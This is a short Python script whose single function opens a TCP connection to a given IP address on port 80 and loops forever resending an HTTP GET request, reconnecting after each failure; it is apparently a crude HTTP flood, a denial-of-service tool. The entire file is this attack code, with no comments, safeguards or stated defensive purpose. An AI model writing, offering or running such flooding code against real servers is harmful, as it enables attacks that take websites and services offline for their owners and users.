import socket
def odnop(ip_adress):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_adress = (ip_adress , 80)
    sock.connect(server_adress)

    message = f"GET / HTTP/1.1\r\nHost: {ip_adress}\r\n\r\n"
    message = message.encode()

    while True:
        try:
            sock.sendall(message)
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_adress = (ip_adress , 80)
            sock.connect(server_adress)
